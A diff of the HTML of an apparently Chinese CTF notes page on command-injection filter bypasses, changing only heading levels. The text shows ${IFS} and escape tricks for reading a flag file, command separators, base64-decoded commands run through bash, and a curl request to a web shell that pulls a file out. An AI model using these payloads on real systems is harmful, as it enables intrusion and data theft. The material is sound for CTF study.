 <p>c\at fl\ag</p>
 </blockquote>
-<h6 id="ifs" class="heading-element"><span>0.0.0.6.5  ${IFS}</span>
+<h2 id="ifs" class="heading-element"><span>${IFS}</span>
   <a href="#ifs" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>$IFS在linux下表示分隔符，单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个丹就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p>
+</h2><p>$IFS在linux下表示分隔符，单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个丹就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p>
 <blockquote>
 <p>cat${IFS}flag</p>
 </blockquote>
@@ -661,26 +716,26 @@ echo 1234&gt;v
 <blockquote>
 <p>cat$IFS$9flag</p>
 </blockquote>
-<h6 id="重定向符" class="heading-element"><span>0.0.0.6.6  重定向符&lt;&gt;</span>
+<h2 id="重定向符" class="heading-element"><span>重定向符&lt;&gt;</span>
   <a href="#%e9%87%8d%e5%ae%9a%e5%90%91%e7%ac%a6" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <p>cat&lt;&gt;flag</p>
 </blockquote>
 <blockquote>
 <p>cat&lt;flag</p>
 </blockquote>
-<h6 id="利用已存在的资源" class="heading-element"><span>0.0.0.6.7  利用已存在的资源</span>
+<h2 id="利用已存在的资源" class="heading-element"><span>利用已存在的资源</span>
   <a href="#%e5%88%a9%e7%94%a8%e5%b7%b2%e5%ad%98%e5%9c%a8%e7%9a%84%e8%b5%84%e6%ba%90" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>从已有的文件或者环境变量中获得相应的字符。</p>
-<h6 id="管道符命令分隔符" class="heading-element"><span>0.0.0.6.8  管道符&amp;命令分隔符</span>
+</h2><p>从已有的文件或者环境变量中获得相应的字符。</p>
+<h2 id="管道符命令分隔符" class="heading-element"><span>管道符&amp;命令分隔符</span>
   <a href="#%e7%ae%a1%e9%81%93%e7%ac%a6%e5%91%bd%e4%bb%a4%e5%88%86%e9%9a%94%e7%ac%a6" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <p>1.==%Oa==符号换行符</p>
 <p>2.==%Od==符号回车符
 3.==;==符号在shell中，担任&quot;连续指令&quot;功能的符号就是&quot;分号”
@@ -702,22 +757,22 @@ echo 1234&gt;v
 <p>||  执行前面的，前面的错误就执行后面的</p>
 <p>&amp;&amp;  前面的执行完执行后面的</p>
 </blockquote>
-<h5 id="无管道符" class="heading-element"><span>0.0.0.7  无管道符</span>
+<h1 id="无管道符" class="heading-element"><span>无管道符</span>
   <a href="#%e6%97%a0%e7%ae%a1%e9%81%93%e7%ac%a6" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>bash &lt; &lt;(base64 -d &lt; &lt;(echo bHMg))，等价 echo bHMg | base64 -d | bash，不使用管道符 |</p>
-<h5 id="下载文件" class="heading-element"><span>0.0.0.8  下载文件</span>
+</h1><p>bash &lt; &lt;(base64 -d &lt; &lt;(echo bHMg))，等价 echo bHMg | base64 -d | bash，不使用管道符 |</p>
+<h1 id="下载文件" class="heading-element"><span>下载文件</span>
   <a href="#%e4%b8%8b%e8%bd%bd%e6%96%87%e4%bb%b6" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>参考</p>
+</h1><p>参考</p>
 <p><code>curl http://192.168.16.218:8005/ye.jsp?cmd=base64 -w0 /usr/sbin/flag.rar|xargs echo|base64 -d &gt; flag2.rar</code></p>
-<h5 id="other-tricks" class="heading-element"><span>0.0.0.9  other tricks</span>
+<h1 id="other-tricks" class="heading-element"><span>other tricks</span>
   <a href="#other-tricks" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>2023陕西省赛一个题匹配了xxx()这种形式，实际上xxx ()也是可以执行的</p>
+</h1><p>2023陕西省赛一个题匹配了xxx()这种形式，实际上xxx ()也是可以执行的</p>
 <p>例如 system (&lsquo;cat /flag&rsquo;);</p></div><div class="post-footer" id="post-footer">
   <div class="post-info">
     <div class="post-info-line">
